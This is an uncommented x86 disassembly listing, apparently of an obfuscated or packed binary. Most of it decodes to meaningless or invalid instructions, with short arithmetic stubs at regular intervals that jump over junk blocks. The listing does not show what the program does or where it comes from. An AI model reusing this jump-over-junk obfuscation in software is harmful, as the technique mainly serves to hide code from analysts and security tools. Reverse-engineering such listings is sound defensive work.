  40b16c:	mov    edx,0xd56a8286
  40b171:	mov    ebp,DWORD PTR [eax-0x77ae3fc4]
  40b177:	bound  esi,QWORD PTR [edx+0x7b42247e]
  40b17d:	push   edx
  40b17e:	cwde   
  40b17f:	ins    DWORD PTR es:[edi],dx
  40b180:	jecxz  0x40b153
  40b182:	or     dh,dh
  40b184:	or     eax,0x5d7c8b5e
  40b189:	mov    ds:0x3f7b5c07,al
  40b18e:	add    al,0xeb
  40b190:	ds (bad) 
  40b192:	lock cmp eax,0xfde39eef
  40b198:	xchg   esi,eax
  40b199:	loopne 0x40b1ef
  40b19b:	(bad)  
  40b19c:	pop    eax
  40b19d:	cld    
  40b19e:	xchg   edx,eax
  40b19f:	pop    ebp
  40b1a0:	les    ecx,FWORD PTR [esi+0x7635f40d]
  40b1a6:	mov    gs:0x9b9c468c,eax
  40b1ac:	(bad)  
  40b1ad:	lahf   
  40b1ae:	jns    0x40b162
  40b1b0:	jle    0x40b190
  40b1b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b1b3:	xor    ebp,0xffffff8e
  40b1b6:	lock sub DWORD PTR [ebx],edi
  40b1b9:	mov    ebx,DWORD PTR [ecx+0x3]
  40b1bc:	daa    
  40b1bd:	loop   0x40b22e
  40b1bf:	in     al,dx
  40b1c0:	gs repz mov ch,0x1e
  40b1c4:	fstp   QWORD PTR [ebx-0x33beeef3]
  40b1ca:	cld    
  40b1cb:	xor    BYTE PTR [esi-0xe300d6a],0x10
  40b1d2:	pop    eax
  40b1d3:	jbe    0x40b160
  40b1d5:	inc    ebp
  40b1d6:	cld    
  40b1d7:	push   0x74
  40b1d9:	pop    edi
  40b1da:	div    edi
  40b1dc:	jmp    0x40b29e
  40b1e1:	jecxz  0x40b169
  40b1e3:	rcl    DWORD PTR [ecx],0xe5
  40b1e6:	push   edi
  40b1e7:	repz test BYTE PTR [edx],0x43
  40b1eb:	shl    DWORD PTR [ecx+0x3874dc25],1
  40b1f1:	adc    eax,0xa5000072
  40b1f6:	add    BYTE PTR [eax],al
  40b1f8:	add    BYTE PTR [ebx+eiz*2-0x20d831c9],bl
  40b1ff:	sub    BYTE PTR [esi+0x35a0c8d9],ch
  40b205:	inc    ecx
  40b206:	or     BYTE PTR ds:0xb56175f5,dh
  40b20c:	loope  0x40b26c
  40b20e:	push   ds
  40b20f:	fsubr  DWORD PTR [eax-0x3a]
  40b212:	inc    esp
  40b213:	loope  0x40b208
  40b215:	fsubr  st,st(1)
  40b217:	icebp  
  40b218:	leave  
  40b219:	and    DWORD PTR [edx-0xa1aef02],ebp
  40b21f:	nop
  40b220:	mov    dh,0x84
  40b222:	hlt    
  40b223:	jb     0x40b1ee
  40b225:	jge    0x40b1c2
  40b227:	mov    ss,WORD PTR [ebx-0x36461c6f]
  40b22d:	call   0x59ad6e80
  40b232:	test   eax,0x79df7de8
  40b237:	adc    eax,esp
  40b239:	mov    eax,ds:0x71a19836
  40b23e:	mov    cl,0xed
  40b240:	pop    esp
  40b241:	ret    0xc352
  40b244:	call   0xa5b0:0x8f6f36e2
  40b24b:	retf   0x28bc
  40b24e:	leave  
  40b24f:	inc    edi
  40b250:	or     al,0x53
  40b252:	rcr    dl,cl
  40b254:	(bad)  
  40b255:	test   BYTE PTR [eax-0x22],dl
  40b258:	cld    
  40b259:	pop    ebp
  40b25a:	inc    ch
  40b25c:	jg     0x40b26a
  40b25e:	and    al,0xed
  40b260:	push   esi
  40b261:	icebp  
  40b262:	cmp    bl,BYTE PTR [eax]
  40b264:	imul   esi,ebx,0xffffffce
  40b267:	out    0x7,al
  40b269:	jge    0x40b2cc
  40b26b:	jecxz  0x40b2ad
  40b26d:	aad    0xb0
  40b26f:	les    esp,FWORD PTR [eax+eiz*1-0x4c164a93]
  40b276:	xchg   edx,eax
  40b277:	xor    edi,DWORD PTR ds:0x412a9409
  40b27d:	sub    BYTE PTR [edx-0x78e9c02e],bh
  40b283:	jae    0x40b303
  40b285:	lds    eax,FWORD PTR [edi+0x1d]
  40b288:	test   al,0x36
  40b28a:	and    BYTE PTR [ecx+0x1db10b82],bl
  40b290:	lahf   
  40b291:	dec    esi
  40b292:	dec    ebx
  40b293:	xchg   edx,eax
  40b294:	sbb    al,0x24
  40b296:	repz or eax,0x805c753e
  40b29c:	mov    ds:0xa9a3bba6,al
  40b2a1:	add    al,BYTE PTR [eax]
  40b2a3:	mov    edi,eax
  40b2a5:	jmp    0x40b367
  40b2aa:	inc    ebp
  40b2ab:	ins    DWORD PTR es:[edi],dx
  40b2ac:	jne    0x40b230
  40b2ae:	jge    0x40b24a
  40b2b0:	imul   edi
  40b2b2:	mov    es,WORD PTR [edi+0x60c33fb]
  40b2b8:	rcr    dh,1
  40b2ba:	mov    edx,0xa5000072
  40b2bf:	add    BYTE PTR [eax],al
  40b2c1:	add    dl,ch
  40b2c3:	popa   
  40b2c4:	push   DWORD PTR [esi]
  40b2c6:	dec    esi
  40b2c7:	lods   al,BYTE PTR ds:[esi]
  40b2c8:	cmp    al,0xd2
  40b2ca:	xor    BYTE PTR [eax+0x7e],ch
  40b2cd:	cmp    BYTE PTR [ecx+0x25cc13c9],bh
  40b2d3:	std    
  40b2d4:	fld    DWORD PTR [eax-0x10305722]
  40b2da:	inc    eax
  40b2db:	inc    eax
  40b2dc:	outs   dx,DWORD PTR ds:[esi]
  40b2dd:	in     eax,dx
  40b2de:	je     0x40b32e
  40b2e0:	push   ebp
  40b2e1:	in     al,dx
  40b2e2:	idiv   BYTE PTR [edx]
  40b2e4:	mov    WORD PTR [eax+ebx*1+0xd1e358e],fs
  40b2eb:	in     eax,dx
  40b2ec:	mov    esp,0x72920f4d
  40b2f1:	sub    eax,0xe0757f6b
  40b2f6:	mov    ch,BYTE PTR [edx+0x2350ea06]
  40b2fc:	das    
  40b2fd:	mov    ah,0xd8
  40b2ff:	pop    ebx
  40b300:	add    al,0xf0
  40b302:	scas   al,BYTE PTR es:[edi]
  40b303:	loope  0x40b364
  40b305:	mov    ds:0xf057207a,eax
  40b30a:	mov    eax,0x96913187
  40b30f:	or     DWORD PTR [edx+0x47],0x635d7bf1
  40b316:	cld    
  40b317:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b318:	sbb    BYTE PTR [edi+0x22],al
  40b31b:	cmp    dl,cl
  40b31d:	idiv   DWORD PTR [esi+0x25]
  40b320:	or     eax,0xe4b5303e
  40b325:	nop
  40b326:	fwait
  40b327:	out    dx,al
  40b328:	cmp    ch,al
  40b32a:	cmp    BYTE PTR [edi],dl
  40b32c:	jnp    0x40b2f0
  40b32e:	sbb    DWORD PTR [ebp-0x54857671],eax
  40b334:	pop    edi
  40b335:	fmul   DWORD PTR cs:[esp+esi*1-0x7df4e89f]
  40b33d:	imul   esp,esi,0x177949c8
  40b343:	mov    ds:0x4a164088,al
  40b348:	jnp    0x40b36f
  40b34a:	arpl   di,di
  40b34c:	xchg   edx,eax
  40b34d:	mov    al,0x3e
  40b34f:	mov    bl,0x62
  40b351:	fnstenv [edi+ebx*4+0x4af9831]
  40b358:	scas   eax,DWORD PTR es:[edi]
  40b359:	mov    dh,0xde
  40b35b:	mov    eax,0xe6ee1dd7
  40b360:	adc    al,0xe5
  40b362:	lds    sp,DWORD PTR [ecx-0x7b]
  40b366:	xor    al,0x8b
  40b368:	inc    ebp
  40b369:	clc    
  40b36a:	mov    edx,DWORD PTR [ebp-0xc]
  40b36d:	or     edi,eax
  40b36f:	mov    eax,0x5520
  40b374:	sub    eax,edx
  40b376:	mov    edx,DWORD PTR [ebp-0x10]
  40b379:	sub    eax,edx
  40b37b:	xor    eax,0x2bfa
  40b380:	jmp    0x40b442
  40b385:	into   
  40b386:	push   cs
  40b387:	fcom   DWORD PTR [eax+ebx*8+0x45eced6]
  40b38e:	xchg   esi,eax
  40b38f:	add    al,0x67
  40b391:	retf   
  40b392:	mov    esi,ebp
  40b394:	cmp    BYTE PTR [edi+0x73],bl
  40b397:	add    BYTE PTR [eax],al
  40b399:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b39a:	add    BYTE PTR [eax],al
  40b39c:	add    BYTE PTR [edi+0x13],ah
  40b39f:	ret    0xa063
  40b3a2:	mov    bl,0x5c
  40b3a4:	cmp    dh,dh
  40b3a6:	(bad)  
  40b3a7:	dec    edi
  40b3a8:	mov    dh,BYTE PTR [ecx+0xae0b55e]
  40b3ae:	inc    ebp
  40b3af:	sub    DWORD PTR [esi-0x59a6b718],ebx
  40b3b5:	es sahf 
  40b3b7:	enter  0xb64f,0xb2
  40b3bb:	xchg   DWORD PTR [ecx],eax
  40b3bd:	test   eax,0x1563daf6
  40b3c2:	stc    
  40b3c3:	into   
  40b3c4:	xchg   esi,eax
  40b3c5:	mov    WORD PTR [edx+0x30416c3b],fs
  40b3cb:	mov    al,ds:0xba819cdd
  40b3d0:	inc    ebx
  40b3d1:	shr    BYTE PTR [esi-0x50aa7985],cl
  40b3d7:	xor    al,0xc7
  40b3d9:	ins    BYTE PTR es:[edi],dx
  40b3da:	mov    eax,ds:0xb4481bcc
  40b3df:	inc    eax
  40b3e0:	jne    0x40b368
  40b3e2:	push   eax
  40b3e3:	ds dec ecx
  40b3e5:	xchg   edx,eax
  40b3e6:	ins    BYTE PTR es:[edi],dx
  40b3e7:	repz xor bl,BYTE PTR [ecx+eiz*8+0x50]
  40b3ec:	pop    edi
  40b3ed:	pop    esi
  40b3ee:	dec    esp
  40b3ef:	mov    BYTE PTR [edi],al
  40b3f1:	mov    dh,0x43
  40b3f3:	and    eax,0xd97060ad
  40b3f8:	mov    esi,0x1eae8e1e
  40b3fd:	ds mov al,0x3a
  40b400:	and    BYTE PTR [eax+0x3c5b9387],0x2d
  40b407:	lahf   
  40b408:	push   cs
  40b409:	adc    al,0x44
  40b40b:	jl     0x40b411
  40b40d:	mov    ecx,0xfee29501
  40b412:	div    BYTE PTR [ecx]
  40b414:	call   DWORD PTR [edx]
  40b416:	call   0x5a228104
  40b41b:	or     bl,BYTE PTR [edi-0x79]
  40b41e:	aad    0x22
  40b420:	add    eax,0x231376ba
  40b425:	sbb    ecx,DWORD PTR [ebx]
  40b427:	ror    DWORD PTR [ebx+0x51c2d383],1
  40b42d:	mov    BYTE PTR [edx+0x7ac14725],cl
  40b433:	sub    BYTE PTR [ebx+ecx*2-0x45],dh
  40b437:	int3   
  40b438:	and    eax,ecx
  40b43a:	fwait
  40b43b:	rcr    BYTE PTR [ebp-0xcea07f7],0xd4
  40b442:	xor    edx,edx
  40b444:	jmp    0x40b506
  40b449:	scas   al,BYTE PTR es:[edi]
  40b44a:	inc    esp
  40b44b:	std    
  40b44c:	mov    ah,0xff
  40b44e:	mov    ebp,0xb6695eef
  40b453:	pop    edi
  40b454:	xchg   ebp,eax
  40b455:	dec    esp
  40b456:	push   ds
  40b457:	cmp    DWORD PTR [ecx],edx
  40b459:	add    al,0x74
  40b45b:	add    BYTE PTR [eax],al
  40b45d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b45e:	add    BYTE PTR [eax],al
  40b460:	add    BYTE PTR [eax-0x11ed185f],cl
  40b466:	mov    eax,0x8b8c5575
  40b46b:	out    dx,al
  40b46c:	neg    DWORD PTR ds:[edi]
  40b46f:	mov    eax,0x7ba120a1
  40b474:	cmp    BYTE PTR [ecx],cl
  40b476:	hlt    
  40b477:	cmp    eax,0x71ab487d
  40b47c:	xchg   esi,eax
  40b47d:	das    
  40b47e:	in     eax,dx
  40b47f:	xlat   BYTE PTR ds:[ebx]
  40b480:	fild   QWORD PTR [edx-0x1a]
  40b483:	out    dx,eax
  40b484:	data16 jns 0x40b439
  40b487:	dec    bh
  40b489:	pop    ebp
  40b48a:	inc    ecx
  40b48b:	iret   
  40b48c:	xor    BYTE PTR [edi-0x51e04f6e],dh
  40b492:	mov    bh,0x2c
  40b494:	hlt    
  40b495:	imul   ecx,DWORD PTR ss:[ebx+0x11],0xffffffd8
  40b49a:	mov    ecx,0x484463fe
  40b49f:	xor    dh,BYTE PTR [ebp+0x53c02ca8]
  40b4a5:	mov    esp,es
  40b4a7:	rol    DWORD PTR [edi-0x4a1bc772],1
  40b4ad:	fwait
  40b4ae:	or     ch,0x28
  40b4b1:	cdq    
  40b4b2:	xlat   BYTE PTR ds:[ebx]
  40b4b3:	or     edi,DWORD PTR [ebx+eiz*1]
  40b4b6:	xchg   ebp,eax
  40b4b7:	pop    es
  40b4b8:	and    al,0x8b
  40b4ba:	mov    ch,0xdf
  40b4bc:	jbe    0x40b4cc
  40b4be:	popa   
  40b4bf:	pop    ecx
  40b4c0:	push   ss
  40b4c1:	seto   BYTE PTR [ecx]
  40b4c4:	cmp    esi,esi
  40b4c6:	jp     0x40b4fa
  40b4c8:	(bad)
  40b4cb:	pop    esp
  40b4cc:	inc    ebp
  40b4cd:	dec    esi
  40b4ce:	(bad)  
  40b4cf:	adc    BYTE PTR [esi],dl
  40b4d1:	inc    ebp
  40b4d2:	push   esi
  40b4d3:	(bad)  
  40b4d4:	(bad)  
  40b4d5:	je     0x40b457
  40b4d7:	xchg   esi,eax
  40b4d8:	rcr    DWORD PTR [edi+0x6b0707b8],1
  40b4de:	lock jmp 0x37a7:0x7731981a
  40b4e6:	jo     0x40b4fc
  40b4e8:	out    dx,al
  40b4e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b4ea:	pop    esi
  40b4eb:	jb     0x40b55b
  40b4ed:	jmp    0x40b516
  40b4ef:	xor    ecx,DWORD PTR [ebp+0x45]
  40b4f2:	sub    BYTE PTR [ecx+edx*1-0x7d],dl
  40b4f6:	mov    dh,0xf7
  40b4f8:	loopne 0x40b4da
  40b4fa:	dec    ebx
  40b4fb:	pop    edi
  40b4fc:	imul   esi,edi,0x69
  40b4ff:	jnp    0x40b542
  40b501:	and    al,0x8
  40b503:	mov    DWORD PTR [edi-0x740c0858],eax
  40b509:	adc    eax,0x42f1b4
  40b50e:	xor    edi,0x2d64
  40b514:	add    edi,ecx
  40b516:	jmp    0x40b5d8
  40b51b:	sub    BYTE PTR [edx-0x111e19c],al
  40b521:	jp     0x40b4d9
  40b523:	aam    0xf2
  40b525:	in     eax,dx
  40b526:	mov    esp,0xccf587ec
  40b52b:	test   eax,0xa5000074
  40b530:	add    BYTE PTR [eax],al
  40b532:	add    BYTE PTR [ebp-0x11],cl
  40b535:	add    dh,ah
  40b537:	nop
  40b538:	cdq    
  40b539:	push   ebp
  40b53a:	push   edx
  40b53b:	xchg   edi,eax
  40b53c:	sbb    ebp,ecx
  40b53e:	into   
  40b53f:	enter  0x9e14,0x9
  40b543:	(bad)
  40b547:	rol    BYTE PTR [esi+ebp*4-0x15],1
  40b54b:	or     dh,bh
  40b54d:	push   ecx
  40b54e:	mov    es,WORD PTR [eax]
  40b550:	cmc    
  40b551:	push   0xdb031767
  40b556:	or     dl,bl
  40b558:	in     al,0x7d
  40b55a:	clc    
  40b55b:	repz popa 
  40b55d:	mov    WORD PTR [edi-0xc0c2715],ds
  40b563:	mov    DWORD PTR [ecx],edi
  40b565:	imul   ecx,DWORD PTR [ebp-0x3fa294ef],0x6f
  40b56c:	cs adc al,0x87
  40b570:	ins    DWORD PTR es:[edi],dx
  40b571:	loopne 0x40b533
  40b573:	cmp    al,0x76
  40b575:	or     dl,bh
  40b577:	pushf  
  40b578:	cdq    
  40b579:	repnz stos DWORD PTR es:[edi],eax
  40b57b:	pop    edx
  40b57c:	pop    ecx
  40b57d:	pop    ebp
  40b57e:	pop    edi
  40b57f:	or     BYTE PTR [edx+edx*2],bh
  40b582:	(bad)  
  40b583:	jmp    0xf351:0x32815444
  40b58a:	stc    
  40b58b:	mov    bl,0x5a
  40b58d:	test   al,0xcb
  40b58f:	js     0x40b57b
  40b591:	leave  
  40b592:	mov    ch,BYTE PTR [ecx-0x16]
  40b595:	mov    edi,0xd7e2ecb
  40b59a:	push   cs
  40b59b:	push   eax
  40b59c:	dec    eax
  40b59d:	lea    ebp,[eax-0x76]
  40b5a0:	and    DWORD PTR [ebx-0x69],eax
  40b5a3:	mov    eax,0x80211a19
  40b5a8:	cmp    DWORD PTR [eax],edx
  40b5aa:	dec    ecx
  40b5ab:	xchg   edi,eax
  40b5ac:	xchg   ecx,eax
  40b5ad:	das    
  40b5ae:	ret    
  40b5af:	and    ecx,DWORD PTR [ebp-0x1d]
  40b5b2:	xor    al,0x7a
  40b5b4:	and    ch,BYTE PTR [edx+0x41333a12]
  40b5ba:	in     eax,dx
  40b5bb:	or     DWORD PTR [eax-0x72],0xc14ba4c0
  40b5c2:	jecxz  0x40b5dc
  40b5c4:	xor    esi,DWORD PTR [ecx+0x3d]
  40b5c7:	test   edi,edx
  40b5c9:	sti    
  40b5ca:	stos   DWORD PTR es:[edi],eax
  40b5cb:	mov    ds:0x6a7abfc1,al
  40b5d0:	fwait
  40b5d1:	lods   al,BYTE PTR ds:[esi]
  40b5d2:	xchg   esi,eax
  40b5d3:	xchg   DWORD PTR [ebx+0x5d],ecx
  40b5d6:	inc    esi
  40b5d7:	mov    cl,0x3
  40b5d9:	cmp    BYTE PTR [ecx+eax*1+0x558b0000],0x8
  40b5e1:	jmp    0x40b6a3
  40b5e6:	rcr    BYTE PTR ds:0xfeef18e3,1
  40b5ec:	sti    
  40b5ed:	fisttp QWORD PTR [edi+eiz*2-0x71c2b1fd]
  40b5f4:	cmp    eax,0x754e70
  40b5f9:	add    BYTE PTR [ebp-0x7f000000],ah
  40b5ff:	adc    eax,0x4158c89e
  40b604:	mov    BYTE PTR [esi-0x6ec8c5f7],dl
  40b60a:	or     cl,cl
  40b60c:	mov    ch,0xc0
  40b60e:	ror    BYTE PTR [ebx+0x16],1
  40b611:	arpl   bx,sp
  40b613:	hlt    
  40b614:	call   0x95fd:0x330b88b7
  40b61b:	mov    dh,0x31
  40b61d:	and    al,BYTE PTR [eax+edi*2+0x8]
  40b621:	adc    DWORD PTR [ebx],edx
  40b623:	cmp    ah,dh
  40b625:	stos   BYTE PTR es:[edi],al
  40b626:	and    BYTE PTR [edi-0x4aa3ba04],ah
  40b62c:	and    DWORD PTR [edi],0xe1f7f6dc
  40b632:	jmp    0xb5da5fc6
  40b637:	mov    ch,0xb3
  40b639:	in     al,dx
  40b63a:	daa    
  40b63b:	or     al,0xd4
  40b63d:	test   DWORD PTR [ecx+ecx*2+0x30d20a30],edi
  40b644:	sar    DWORD PTR [edx+0x65],1
  40b647:	(bad)  
  40b648:	sbb    BYTE PTR [esi],al
  40b64a:	repz test DWORD PTR [edx-0x7ebcdb8f],ebp
  40b651:	outs   dx,DWORD PTR ds:[esi]
  40b652:	std    
  40b653:	mov    ds:0x65cde551,eax
  40b658:	ins    BYTE PTR es:[edi],dx
  40b659:	aad    0xdc
  40b65b:	xchg   esi,eax
  40b65c:	xor    al,0xc2
  40b65e:	ins    BYTE PTR es:[edi],dx
  40b65f:	dec    ebx
  40b660:	jae    0x40b621
  40b662:	jne    0x40b6ba
  40b664:	push   ss
  40b665:	push   0xe
  40b667:	mov    ecx,fs
  40b669:	mov    ebx,0x925a9805
  40b66e:	mov    al,0xd6
  40b670:	jp     0x40b6d7
  40b672:	jb     0x40b630
  40b674:	push   esi
  40b675:	(bad)  
  40b676:	mov    cl,0xa8
  40b678:	pop    edi
  40b679:	mov    edx,0x5f2b0094
  40b67e:	inc    DWORD PTR [eax+eiz*2+0x67]
  40b682:	cmp    DWORD PTR ds:0x32b294c8,0x11
  40b689:	xchg   DWORD PTR [ecx],edi
  40b68b:	mov    BYTE PTR [esi+0x3a00cbc9],bl
  40b691:	jbe    0x40b6d8
  40b693:	iret   
  40b694:	arpl   si,di
  40b696:	cli    
  40b697:	xor    bh,ch
  40b699:	inc    esi
  40b69a:	jl     0x40b6b4
  40b69c:	xchg   esp,eax
  40b69d:	les    ebx,FWORD PTR [eax+0x69]
  40b6a0:	pop    ebp
  40b6a1:	lahf   
  40b6a2:	push   esi
  40b6a3:	mov    dl,BYTE PTR [edi+edx*1-0x5dbf]
  40b6aa:	mov    edi,DWORD PTR [ebp-0x14]
  40b6ad:	mov    BYTE PTR [eax+ecx*1-0x7e47],dl
  40b6b4:	xor    edx,edx
  40b6b6:	mov    eax,0x71c7
  40b6bb:	div    edi
  40b6bd:	jmp    0x40b77f
  40b6c2:	dec    edx
  40b6c3:	call   0xbf5b:0xfffeffae
  40b6ca:	pop    ss
  40b6cb:	cmp    eax,0x6ef70d77
  40b6d0:	out    0x33,eax
  40b6d2:	repz jne 0x40b6d5
  40b6d5:	add    BYTE PTR [ebp-0x3f000000],ah
  40b6db:	outs   dx,DWORD PTR ds:[esi]
  40b6dc:	sub    cl,ch
  40b6de:	sub    cl,BYTE PTR ds:0xbcf30af1
  40b6e4:	or     edx,eax
  40b6e6:	out    dx,al
  40b6e7:	jp     0x40b6d2
  40b6e9:	push   0xcf7c5370
  40b6ee:	adc    ax,0x32c2
  40b6f2:	xchg   esp,eax
  40b6f3:	xchg   ecx,eax
  40b6f4:	mov    BYTE PTR [eax+0x3c],dl
  40b6f7:	sar    BYTE PTR [ebp+0x45b27efb],cl
  40b6fd:	(bad)  
  40b6fe:	mov    esi,0x5989d35f
  40b703:	mov    bl,0xe2
  40b705:	sub    eax,0x35e41684
  40b70a:	inc    eax
  40b70b:	inc    ecx
  40b70c:	in     eax,0xd8
  40b70e:	mov    esi,0xf8f5dd32
  40b713:	sbb    DWORD PTR [esi],eax
  40b715:	loopne 0x40b6e9
  40b717:	mov    dl,0xdc
  40b719:	add    ebp,DWORD PTR [ebp+0x33f89131]
  40b71f:	or     al,0x8c
  40b721:	outs   dx,BYTE PTR ds:[esi]
  40b722:	int    0xb7
  40b724:	cmp    BYTE PTR [edx],dl
  40b726:	in     eax,dx
  40b727:	ficom  DWORD PTR [edi]
  40b729:	xor    esi,DWORD PTR [ecx]
  40b72b:	mov    edx,0x83e82a5d
  40b730:	or     DWORD PTR [eax+edi*2+0xe],ebp
  40b734:	adc    DWORD PTR [esi],esp
  40b736:	stos   BYTE PTR es:[edi],al
  40b737:	cld    
  40b738:	shl    BYTE PTR [edx],0xe9
  40b73b:	push   esi
  40b73c:	mov    edi,0xb046bda
  40b741:	or     BYTE PTR [ecx+0x6b],cl
  40b744:	push   ss
  40b745:	adc    bh,BYTE PTR [ebx-0x43c7cf11]
  40b74b:	std    
  40b74c:	repnz pop di
  40b74f:	or     dl,BYTE PTR [edi+0x10]
  40b752:	nop
  40b753:	jo     0x40b77c
  40b755:	mov    ds:0xf180307a,eax
  40b75a:	adc    ah,BYTE PTR [edi+0xe]
  40b75d:	test   eax,0x24e22a14
  40b762:	pop    esi
  40b763:	test   al,0x57
  40b765:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b766:	mov    eax,ds:0xd7094c47
  40b76b:	mov    eax,ds:0x92943011
  40b770:	dec    esi
  40b771:	pop    eax
  40b772:	or     eax,0xdca80d42
  40b777:	mov    ah,0x9f
  40b779:	js     0x40b7d7
  40b77b:	(bad)  
  40b77c:	xchg   ebp,eax
  40b77d:	test   al,0xa
  40b77f:	mov    edx,DWORD PTR [ebp-0x18]
  40b782:	mov    edi,0x5068
  40b787:	add    eax,0x3a6f
  40b78c:	xor    eax,edx
  40b78e:	xor    edx,edx
  40b790:	div    edi
  40b792:	mov    edi,DWORD PTR [ebp-0x1c]
  40b795:	jmp    0x40b857
  40b79a:	dec    esi
  40b79b:	shl    edi,1
  40b79d:	jmp    0x332e:0xf55feeff
  40b7a4:	rcr    BYTE PTR [edi-0x2a],0x84
  40b7a8:	repnz or eax,0x7698
  40b7ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b7af:	add    BYTE PTR [eax],al
  40b7b1:	add    BYTE PTR [edx+0x55636d76],bl
  40b7b7:	pop    edi
  40b7b8:	lds    ebp,FWORD PTR [eax-0x3d]
  40b7bb:	pop    esi
  40b7bc:	push   esi
  40b7bd:	mov    esp,0x56618834
  40b7c2:	(bad)  
  40b7c3:	pop    esi
  40b7c4:	nop
  40b7c5:	adc    BYTE PTR [edi-0x7d],al
  40b7c8:	push   0xffffffdc
  40b7ca:	jne    0x40b771
  40b7cc:	mov    esp,0xb6bbc533
  40b7d1:	imul   edx,edx,0xde000f83
  40b7d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b7d8:	pop    ds
  40b7d9:	(bad)
  40b7dc:	(bad)  
  40b7dd:	lods   al,BYTE PTR ds:[esi]
  40b7de:	and    DWORD PTR [esi-0x381ca164],edi
  40b7e4:	cmp    ebp,edi
  40b7e6:	adc    al,0x92
  40b7e8:	jnp    0x40b7f8
  40b7ea:	xor    bh,al
  40b7ec:	mov    ebp,0x1704a92
  40b7f1:	mov    bh,0x99
  40b7f3:	(bad)  
  40b7f5:	test   eax,0xff5c63e7
  40b7fa:	gs push ebp
  40b7fc:	lods   eax,DWORD PTR ds:[esi]
  40b7fd:	(bad)  
  40b7fe:	pusha  
  40b7ff:	jg     0x40b871
  40b801:	test   BYTE PTR [eax],dh
  40b803:	jnp    0x40b7fc
  40b805:	push   edx
  40b806:	fmul   DWORD PTR [ebp-0x14]
  40b809:	mov    dh,0xbf
  40b80b:	gs push 0x28ffb643
  40b811:	sub    BYTE PTR [edx-0x5df1a4f9],dl
  40b817:	adc    eax,edi
  40b819:	pop    es
  40b81a:	jmp    0x40b7ea
  40b81c:	jmp    esi
  40b81e:	mov    ds:0x27876d6,al
  40b823:	jle    0x40b7ee
  40b825:	pop    eax
  40b826:	stos   BYTE PTR es:[edi],al
  40b827:	dec    edx
  40b828:	mov    WORD PTR [esi-0x1],?
  40b82b:	retf   0xdc88
  40b82e:	sbb    al,0x20
  40b830:	popa   
  40b831:	inc    ecx
  40b832:	jecxz  0x40b891
  40b834:	fld    QWORD PTR [edi-0x17]
  40b837:	mov    WORD PTR [ebx+0x6a],?
  40b83a:	jmp    0x1d838878
  40b83f:	adc    DWORD PTR [edi],ebx
  40b841:	push   ds
  40b842:	out    0x48,eax
  40b844:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b845:	cdq    
  40b846:	arpl   WORD PTR [ebx],sp
  40b848:	and    DWORD PTR [esi-0x5330172c],ebp
  40b84e:	mov    al,0x78
  40b850:	xor    dh,BYTE PTR [ecx-0x61]
  40b853:	fs adc DWORD PTR cs:[ecx+0x33],edx
  40b858:	rol    BYTE PTR [ebx],cl
  40b85a:	enter  0x458b,0xe0
  40b85e:	jmp    0x40b920
  40b863:	sbb    ah,BYTE PTR [esi+0x68]
  40b866:	ins    DWORD PTR es:[edi],dx
  40b867:	jl     0x40b8d8
  40b869:	pop    ds
  40b86a:	ja     0x40b7f6
  40b86c:	pop    DWORD PTR [edi+0x74]
  40b86f:	in     eax,dx
  40b870:	adc    ebp,DWORD PTR [ecx]
  40b872:	mov    edi,0x773d
  40b877:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b878:	add    BYTE PTR [eax],al
  40b87a:	add    BYTE PTR [eax],bh
  40b87c:	daa    
  40b87d:	aam    0xb5
  40b87f:	mov    DWORD PTR [ebx+0x1c],edi
  40b882:	es out 0x31,eax
  40b885:	aas    
  40b886:	push   esp
  40b887:	cmp    bh,ch
  40b889:	clc    
  40b88a:	jmp    0x4ddaab19
  40b88f:	and    ch,ah
  40b891:	pop    ebp
  40b892:	xor    eax,0xb62f2af2
  40b897:	and    al,0x6e
  40b899:	rol    DWORD PTR ds:0x20a47e4d,1
  40b89f:	mov    ah,0x4a
  40b8a1:	test   DWORD PTR gs:[esi],eax
  40b8a4:	(bad)  
  40b8a5:	stos   BYTE PTR es:[edi],al
  40b8a6:	cli    
  40b8a7:	ja     0x40b874
  40b8a9:	call   0x7268:0x84562c22
  40b8b0:	mov    esp,ebp
  40b8b2:	(bad)  
  40b8b3:	mov    ds:0x8d84a1b8,al
  40b8b8:	mov    esp,DWORD PTR [edi]
  40b8ba:	je     0x40b91d
  40b8bc:	add    BYTE PTR [edi],0xb0
  40b8bf:	cmp    eax,0x6b640d95
  40b8c4:	mov    ds:0x771e50c8,eax
  40b8c9:	out    0x1,eax
  40b8cb:	and    DWORD PTR [ecx+0x34],ecx
  40b8ce:	neg    DWORD PTR [ebp+0x6]
  40b8d1:	les    eax,FWORD PTR [ebx]
  40b8d3:	xlat   BYTE PTR ds:[ebx]
  40b8d4:	shl    DWORD PTR [ebx-0x42],cl
  40b8d7:	jno    0x40b929
  40b8d9:	sbb    BYTE PTR [ecx+0x536ff616],bh
  40b8df:	(bad)  
  40b8e0:	in     al,0xa2
  40b8e2:	and    eax,0x36decf8c
  40b8e7:	(bad)  
  40b8e9:	cwde   
  40b8ea:	and    BYTE PTR [ebp+0x4a773a3d],dh
  40b8f0:	(bad)  
  40b8f1:	xor    BYTE PTR [ebp+0x366377fa],dh
  40b8f7:	jo     0x40b951
  40b8f9:	out    dx,al
  40b8fa:	and    DWORD PTR [esp+esi*4-0xd],ebp
  40b8fe:	xor    esi,DWORD PTR [edx+0x58]
  40b901:	hlt    
  40b902:	iret   
  40b903:	mov    ebp,0x310992b2
  40b908:	addr16 inc eax
  40b90a:	fcom   QWORD PTR [esi+ecx*1]
  40b90d:	adc    BYTE PTR [ebp+0x7b56aef3],bl
  40b913:	xchg   BYTE PTR [ebx],bh
  40b915:	add    ecx,esi
  40b917:	ins    DWORD PTR es:[edi],dx
  40b918:	fidiv  WORD PTR [esi+0x6f6f3612]
  40b91e:	shr    BYTE PTR [edi-0x9],cl
  40b921:	test   DWORD PTR [ebx-0x1ed223ab],0xb000079
  40b92b:	ret    0xbde9
  40b92e:	add    BYTE PTR [eax],al
  40b930:	add    BYTE PTR [ebx],dl
  40b932:	push   edi
  40b933:	int    0xcd
